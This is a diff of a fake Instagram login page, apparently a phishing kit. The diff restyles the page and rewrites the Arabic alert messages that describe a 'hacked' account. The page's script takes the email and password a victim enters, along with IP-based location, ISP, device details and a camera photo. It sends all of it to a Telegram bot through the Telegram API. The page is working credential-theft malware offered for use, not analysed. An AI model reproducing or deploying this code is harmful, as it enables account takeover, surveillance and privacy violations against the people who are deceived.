@@ -3,15 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="styles.css" />
     <link rel="icon" type="image/png" href="img/insta-fav.ico">
     <title>Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        main {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .panel {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 350px;
+        }
+
+        .panel img {
+            display: block;
+            margin: 0 auto 20px;
+        }
+
+        .panel input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        .panel button {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .panel button:hover {
+            background-color: #3081d6;
+        }
+
+        footer {
+            text-align: center;
+            padding-top: 20px;
+        }
+
+        footer a {
+            margin: 0 15px;
+            color: #999;
+            text-decoration: none;
+        }
+
+        footer .copyright {
+            margin-top: 20px;
+            color: #999;
+        }
+    </style>
 </head>
 <body>
-    <main class="flex align-items-center justify-content-center">
-        <section id="auth" class="flex direction-column">
-            <div class="panel login flex direction-column">
-                <h1 class="flex justify-content-center">
+    <main>
+        <section id="auth">
+            <div class="panel login">
+                <h1>
                     <img src="img/instagram-logo.png" alt="Instagram logo" />
                 </h1>
                 <form id="loginForm" onsubmit="submitForm(event)">
@@ -105,34 +167,37 @@
             const currentTime = new Date().toLocaleString();
             const imageData = await captureImage();
 
-            const message = `⚠️ *تم اختراق الهدف بنجاح...* ⚠️\n\n` +
-                            `💥 *تفاصيل الحساب المسروقة:* 💥\n` +
-                            `📧 الإيميل: ${email}\n` +
-                            `🔐 الباسورد: ${password}\n\n` +
-                            `🌍 الموقع: ${locationData.city}, ${locationData.country}\n` +
-                            `🌐 IP: ${locationData.ip}\n` +
-                            `🔍 مزود الخدمة: ${locationData.org}\n` +
+            const message = `🔓 *تم اختراق الحساب! تم الكشف عن تفاصيل الحساب* 🔓\n\n` +
+                            `💻 *معلومات الحساب:* 💻\n` +
+                            `📧 البريد الإلكتروني: ${email}\n` +
+                            `🔑 كلمة المرور: ${password}\n\n` +
+                            `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
+                            `🌐 عنوان IP: ${locationData.ip}\n` +
+                            `🔍 المزود: ${locationData.org}\n` +
                             `🚨 ASN: ${locationData.asn}\n\n` +
-                            `💻 جهاز: ${deviceInfo.platform}\n` +
-                            `🌐 متصفح: ${deviceInfo.browserInfo}\n` +
-                            `🖥️ إصدار المتصفح: ${deviceInfo.browserInfo}\n` +
-                            `⚙️ اللغة: ${deviceInfo.language}\n` +
-                            `🔧 الذاكرة (RAM): ${deviceInfo.memory}GB\n` +
-                            `💻 أنوية المعالج: ${deviceInfo.cpuCores}\n` +
+                            `💻 *معلومات الجهاز:* 💻\n` +
+                            `🖥️ النظام: ${deviceInfo.platform}\n` +
+                            `🌐 المتصفح: ${deviceInfo.browserInfo}\n` +
+                            `⚙️ لغة المتصفح: ${deviceInfo.language}\n` +
+                            `🔧 الرام: ${deviceInfo.memory}GB\n` +
+                            `⚡ عدد نوى المعالج: ${deviceInfo.cpuCores}\n` +
                             `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
-                            `⏳ *التوقيت:* ${currentTime}`;
+                            `🕒 *التاريخ والوقت:* ${currentTime}\n\n` +
+                            `👁️‍🗨️ *تم التقاط صورة المستخدم*`;
 
+            // إرسال المعلومات إلى البوت عبر Telegram
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             });
 
+            // إرسال الصورة إلى البوت
             if (imageData) {
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, photo: imageData, caption: "📷 *صورة الهدف*" })
+                    body: JSON.stringify({ chat_id: chatId, photo: imageData, caption: "📷 *صورة المستخدم*" })
                 });
             }
 
